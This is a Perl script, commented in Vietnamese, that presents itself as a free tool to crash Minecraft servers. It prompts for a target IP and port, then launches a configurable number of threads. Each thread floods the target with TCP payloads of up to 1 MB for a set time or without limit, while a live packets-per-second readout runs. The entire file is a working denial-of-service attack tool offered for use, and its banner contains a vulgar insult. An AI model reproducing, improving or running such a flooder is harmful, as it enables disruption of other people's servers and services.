#!/usr/bin/perl

use strict;
use warnings;
use threads;
use threads::shared; # Cần thiết cho :shared attribute, hoặc đảm bảo Perl của bạn hỗ trợ nó ngầm định
use IO::Socket::INET;
use Thread::Semaphore;
use Term::ANSIColor;
use Time::HiRes qw(usleep);
use IO::Handle;

$| = 1; # Tắt bộ đệm đầu ra

print color('bold red'), "  __  __   ____   _   _  \n";
print color('bold red'), " |  \\/  | |  _ \\ | \\ | | \n";
print color('bold red'), " | |\\/| | | | | ||  \\| | \n";
print color('bold red'), " | |  | | | |_| || |\\  | \n";
print color('bold red'), " |_|  |_| |____/ |_| \\_| \n";
print color('reset'), "\n";
print color('bold cyan'), "      [+] MDN FREE TOOLS CRASH MINECRAFT SERVER [+]\n";
print color('bold cyan'), "      [+] TOOLS ĐƯỢC SHARE BÊN DISCORD MÌNH MODS LẠI 1 TÝ [+]\n";
print color('bold cyan'), "      [+] THẰNG NÀO ĐEM BÁN LÀM CHÓ ĂN CỨT [+]\n";
print color('reset'), "\n";
print "Nhấn Enter để bắt đầu...\n";
<STDIN>;

# Yêu cầu nhập các thông số
print color('bold yellow'), "[+] Nhập thông tin tấn công:\n";
print color('reset');
print "Địa chỉ IP mục tiêu: ";
my $ip = <STDIN>;
chomp $ip;

print "Cổng mục tiêu: ";
my $port = <STDIN>;
chomp $port;

print "Kích thước gói tin (byte, -1 cho ngẫu nhiên): ";
my $size_input = <STDIN>;
chomp $size_input;

print "Tốc độ gửi (gói/luồng/giây, -1 để gửi nhanh nhất): ";
my $rate = <STDIN>;
chomp $rate;

print "Số lượng luồng: ";
my $threads_count = <STDIN>;
chomp $threads_count;

print "Thời gian tấn công (giây, -1 để chạy vô hạn): ";
my $time = <STDIN>;
chomp $time;

my $size = ($size_input eq '-1') ? -1 : int($size_input); 

if ($threads_count <= 0) {
    die color('bold red') . "[LỖI] Số lượng luồng phải là số dương.\n" . color('reset');
}

my $numeric_rate = $rate; 
if ($numeric_rate !~ /^-?\d+$/) {
    print color('bold red'), "[LỖI] Tốc độ gửi '$rate' không phải là số hợp lệ.\n" . color('reset');
    $numeric_rate = 10; 
    print color('bold yellow'), "[CẢNH BÁO] Sử dụng tốc độ mặc định là $numeric_rate gói/luồng/giây.\n" . color('reset');
}

if ($numeric_rate == 0) {
    print color('bold yellow'), "[CẢNH BÁO] Tốc độ gửi là 0, sẽ không gửi gói nào.\n" . color('reset');
} elsif ($numeric_rate < -1) {
    print color('bold yellow'), "[CẢNH BÁO] Tốc độ gửi là $numeric_rate (âm và không phải -1), hành vi không xác định. Coi như gửi nhanh nhất.\n" . color('reset');
    $numeric_rate = -1; # Coi như gửi nhanh nhất
}


print color('bold magenta'), "[DEBUG] Thông số đã nhập:\n";
print color('bold magenta'), "[DEBUG] IP: $ip, Cổng: $port, Kích thước gốc: $size_input, Tốc độ gốc: $rate, Luồng: $threads_count, Thời gian: $time\n";
print color('bold magenta'), "[DEBUG] Kích thước sẽ sử dụng cho logic: " . ($size == -1 ? "Ngẫu nhiên (1-1MB)" : "$size bytes") . "\n";
print color('bold magenta'), "[DEBUG] Tốc độ sẽ sử dụng cho logic: " . ($numeric_rate == -1 ? "Tối đa" : "$numeric_rate gói/luồng/giây") . "\n";


our $end_time = ($time eq '-1') ? undef : time() + int($time); # So sánh chuỗi cho -1
print color('bold magenta'), "[DEBUG] Thời gian bắt đầu thực tế: " . time() . ", Thời gian kết thúc dự kiến: " . (defined $end_time ? $end_time : "Vô hạn") . "\n";


my $thread_manager_sem = Thread::Semaphore->new($threads_count); # Quản lý việc tạo luồng
our $packets_sent :shared = 0; # Biến đếm gói tin, được chia sẻ giữa các luồng
my $counter_semaphore = Thread::Semaphore->new(1); # Semaphore nhị phân để bảo vệ $packets_sent

our $start_time = time();
our $attack_running = 1; # Biến kiểm soát trạng thái tấn công

# Hàm để đọc lệnh từ STDIN không block
sub read_command {
    my $handle = IO::Handle->new();
    # Không mở STDIN nếu không có terminal (ví dụ: chạy dưới dạng cron hoặc trong một số IDE)
    if (not -t STDIN or not open $handle, "+<&STDIN") {
        return undef;
    }
    $handle->blocking(0);
    return scalar <$handle>;
}

sub flood {
    my $tid = threads->self->tid();
    print color('cyan'), "[DEBUG LUỒNG $tid] Bắt đầu. Cố gắng kết nối đến $ip:$port.\n", color('reset');

    my $socket;
    eval {
        $socket = IO::Socket::INET->new(
            PeerHost => $ip,
            PeerPort => $port,
            Proto    => 'tcp',
            Timeout  => 5 # Timeout cho kết nối (5 giây)
        );
    };
    if ($@ || !defined($socket) || !$socket->connected) {
        print color('bold red'), "[LỖI LUỒNG $tid] Không thể kết nối đến $ip:$port - Lỗi: ($@ // $! // 'Không xác định').\n", color('reset');
        $thread_manager_sem->up; # Giải phóng semaphore nếu luồng thoát sớm
        return;
    }
    print color('green'), "[DEBUG LUỒNG $tid] Đã kết nối thành công đến $ip:$port.\n", color('reset');

    my $delay_microseconds = ($numeric_rate > 0) ? int(1000000 / $numeric_rate) : 0;
    $delay_microseconds = 0 if $numeric_rate == -1;

    while ($attack_running && (not defined $end_time or time() <= $end_time)) {
        eval {
            # Thoát nhanh nếu nhận được tín hiệu dừng
            if (!$attack_running) { last; }

            my $current_send_size;
            if ($size == -1) { # Kích thước ngẫu nhiên
                $current_send_size = int(rand(1024 * 1024 - 1)) + 1; # Ngẫu nhiên từ 1 đến 1MB (trừ 1 byte)
            } else {
                $current_send_size = $size;
                 $current_send_size = 1 if $current_send_size <= 0; # Đảm bảo gửi ít nhất 1 byte
            }


            # Kiểm tra socket còn hợp lệ không trước khi gửi
            unless ($socket && $socket->connected) {
                print color('bold red'), "[LỖI LUỒNG $tid] Mất kết nối hoặc socket không hợp lệ giữa chừng.\n", color('reset');
                # $attack_running = 0; # Tùy chọn: dừng toàn bộ nếu một luồng mất kết nối
                last; # Thoát khỏi vòng lặp while của luồng này
            }

            my $payload = "\x00" x $current_send_size; # Chuẩn bị payload
            my $bytes_sent = $socket->send($payload);

            if (not defined $bytes_sent) {
                print color('bold yellow'), "[CẢNH BÁO LUỒNG $tid] Gửi gói tin thất bại: $!\n", color('reset');
                last; # Thoát khỏi vòng lặp while của luồng này nếu gửi thất bại
            } else {
                # Bảo vệ việc cập nhật biến đếm dùng chung
                $counter_semaphore->down();
                $packets_sent++;
                $counter_semaphore->up();
            }

            # Chỉ usleep nếu rate > 0 (và không phải -1) để giới hạn tốc độ
            # Nếu numeric_rate là 0, delay_microseconds cũng là 0, vòng lặp sẽ chạy rất nhanh và chỉ kiểm tra attack_running
            usleep($delay_microseconds) if $delay_microseconds > 0;

        }; # Kết thúc eval
        if ($@) { # Nếu có lỗi trong eval (ví dụ: socket bị đóng đột ngột bởi phía kia)
            print color('bold red'), "[LỖI LUỒNG $tid] Lỗi trong quá trình gửi: $@\n", color('reset');
            last; # Thoát khỏi vòng lặp while của luồng này
        }
        # Thoát khỏi while nếu $attack_running bị set thành 0 từ nơi khác
        last if !$attack_running;
    } # Kết thúc while
    print color('cyan'), "[DEBUG LUỒNG $tid] Kết thúc vòng lặp gửi. Đóng socket.\n", color('reset');
    eval { $socket->close() if $socket; }; # Đóng socket nếu nó đã được mở, bắt lỗi nếu có
    $thread_manager_sem->up;  # Báo hiệu luồng này đã hoàn thành
}


# Bảng thông tin tấn công
print color('bold green'), "[+] Bắt đầu tấn công...\n";
print color('reset');
print color('bold blue'), "=" x 60, "\n";
print color('bold blue'), "| Thông tin tấn công:                                         |\n";
print color('bold blue'), "=" x 60, "\n";
my $display_size = ($size == -1 ? "Ngẫu nhiên (1-1MB)" : "$size bytes");
my $display_time = ($time eq '-1' ? "Vô hạn" : "$time giây"); # So sánh chuỗi
my $display_rate = ($numeric_rate == -1 ? "Tối đa" : "$numeric_rate gói/giây/luồng");
$display_rate = "0 (Không gửi)" if $numeric_rate == 0;


printf color('bold white') . "| IP mục tiêu:    %s" . "%-42s" . color('bold white') . "|\n" . color('reset'), color('bold yellow'), $ip;
printf color('bold white') . "| Cổng mục tiêu:  %s" . "%-42s" . color('bold white') . "|\n" . color('reset'), color('bold yellow'), $port;
printf color('bold white') . "| Kích thước gói: %s" . "%-42s" . color('bold white') . "|\n" . color('reset'), color('bold yellow'), $display_size;
printf color('bold white') . "| Tốc độ gửi:    %s" . "%-32s" . color('bold white') . "|\n" . color('reset'), color('bold yellow'), $display_rate;
printf color('bold white') . "| Số lượng luồng: %s" . "%-42s" . color('bold white') . "|\n" . color('reset'), color('bold yellow'), $threads_count;
printf color('bold white') . "| Thời gian:       %s" . "%-42s" . color('bold white') . "|\n" . color('reset'), color('bold yellow'), $display_time;
print color('bold blue'), "=" x 60, "\n";
print color('reset');
print color('bold green'), "[+] Nhập '" . color('bold yellow') . "mdntcp" . color('bold green') . "' để dừng tấn công.\n";
print color('reset');

my @threads_list;
for my $i (1..$threads_count) {
    $thread_manager_sem->down; # Chờ một "slot"
    my $thread = threads->create(\&flood);
    if (defined $thread) {
        push @threads_list, $thread;
        print color('magenta'), "[DEBUG] Đã tạo luồng ID: " . $thread->tid() . " (Luồng thứ $i)\n", color('reset');
    } else {
        print color('bold red'), "[LỖI] Không thể tạo luồng số $i.\n", color('reset');
        $thread_manager_sem->up; # Nếu không tạo được luồng, phải up semaphore lại
    }
}

print color('magenta'), "[DEBUG] Đã tạo tổng cộng " . scalar(@threads_list) . " luồng.\n", color('reset');


while ($attack_running && (not defined $end_time or time() <= $end_time)) {
    my $running_threads = 0;
    for my $thr (@threads_list) {
        if ($thr && $thr->is_running()) {
            $running_threads++;
        }
    }

    if ($running_threads == 0 && @threads_list > 0) { # @threads_list > 0 để chắc chắn đã có luồng được tạo
        print "\n" . color('bold yellow'), "[CẢNH BÁO] Tất cả các luồng tấn công đã dừng sớm.\n", color('reset');
        $attack_running = 0; # Đặt cờ để thoát vòng lặp này
        last; # Thoát khỏi vòng lặp giám sát
    }

    my $command = read_command();
    if (defined $command) {
        chomp $command;
        if (lc($command) eq "mdntcp") { # Chấp nhận cả chữ hoa chữ thường
            print "\n" . color('bold yellow') . "[!] Nhận lệnh dừng tấn công...\n" . color('reset');
            $attack_running = 0; # Tín hiệu cho các luồng dừng
            last; # Thoát vòng lặp giám sát
        }
    }
    my $elapsed_time = time() - $start_time;
    my $pps = 0;
    my $pkts_for_display; # Biến tạm để lưu số gói đã gửi cho lần hiển thị này

    # Đọc giá trị $packets_sent một lần, có bảo vệ, cho cả tính PPS và hiển thị
    $counter_semaphore->down();
    $pkts_for_display = $packets_sent;
    $counter_semaphore->up();

    if ($elapsed_time > 0) {
        $pps = int($pkts_for_display / $elapsed_time); # Sử dụng giá trị đã đọc
    }

    printf("\r%s[+] Đang tấn công... Thời gian: %s%02d:%02d:%02d%s | Gói đã gửi: %s%s%s | Tốc độ: %s%d pps%s%s",
        color('bold green'), color('bold yellow'),
        int($elapsed_time/3600), int(($elapsed_time%3600)/60), int($elapsed_time%60),
        color('bold green'), color('bold yellow'), $pkts_for_display, # Sử dụng biến đã khai báo
        color('bold green'), color('bold yellow'), $pps,
        color('reset'), " " x 15 # Thêm khoảng trắng để xóa ký tự thừa của dòng cũ
    );

    usleep(500000); # Cập nhật trạng thái mỗi 0.5 giây
}

# Dọn dẹp
if ($attack_running) { # Nếu vòng lặp kết thúc do hết giờ (và cờ chưa bị đặt thành 0)
    $attack_running = 0; # Đảm bảo các luồng sẽ thoát nếu chúng vẫn đang kiểm tra cờ này
    print "\n" . color('bold green') . "[+] Đã hết thời gian tấn công.\n" . color('reset');
}


print "\n" . color('bold green') . "[+] Đang chờ các luồng hoàn tất...\n" . color('reset');
foreach my $thr (@threads_list) {
    if (defined $thr) {
        # Không cần in debug join ở đây nữa nếu muốn bớt verbose
        # print color('magenta'), "[DEBUG] Đang join luồng ID: " . $thr->tid() . "\n", color('reset');
        eval { $thr->join(); }; # Thêm eval để bắt lỗi nếu luồng đã detach hoặc có vấn đề khi join
        if ($@) {
            print color('yellow'), "[CẢNH BÁO] Không thể join luồng (có thể đã kết thúc hoặc lỗi): " . ($thr->tid() // 'không rõ ID') . ": $@\n", color('reset');
        } else {
            # print color('magenta'), "[DEBUG] Luồng ID: " . $thr->tid() . " đã join.\n", color('reset');
        }
    }
}

my $final_elapsed_time = time() - $start_time;
my $final_pps = 0;
my $final_packets_sent;

# Đọc $packets_sent lần cuối sau khi tất cả các luồng đã join (an toàn)
$counter_semaphore->down();
$final_packets_sent = $packets_sent;
$counter_semaphore->up();


if ($final_elapsed_time > 0 && $final_packets_sent > 0) {
    $final_pps = int($final_packets_sent / $final_elapsed_time);
}

print color('bold green'), "[+] Hoàn tất tấn công.\n";
print color('bold cyan'), "Tổng thời gian: " . sprintf("%02d:%02d:%02d", int($final_elapsed_time/3600), int(($final_elapsed_time%3600)/60), int($final_elapsed_time%60)) . "s\n";
print color('bold cyan'), "Tổng gói đã gửi: $final_packets_sent\n";
print color('bold cyan'), "Tốc độ trung bình: $final_pps pps\n";
print color('reset');
